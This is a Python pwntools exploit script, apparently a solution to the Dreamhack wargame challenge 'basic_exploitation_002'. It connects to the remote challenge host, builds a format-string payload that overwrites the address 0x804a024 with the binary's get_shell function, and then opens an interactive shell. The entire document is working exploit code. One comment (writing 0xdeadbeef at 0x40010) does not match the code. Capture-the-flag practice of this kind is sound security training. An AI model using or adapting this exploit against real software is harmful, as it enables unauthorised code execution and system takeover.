from pwn import *
elf = ELF('./basic_exploitation_002')
# p = process('./basic_exploitation_002')
p = remote('host3.dreamhack.games', 19688)
# # the format string offset
offset = 1

# the writes you want to perform
writes = {
    0x804a024: elf.symbols['get_shell'],  # write 0xdeadbeef at 0x40010
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
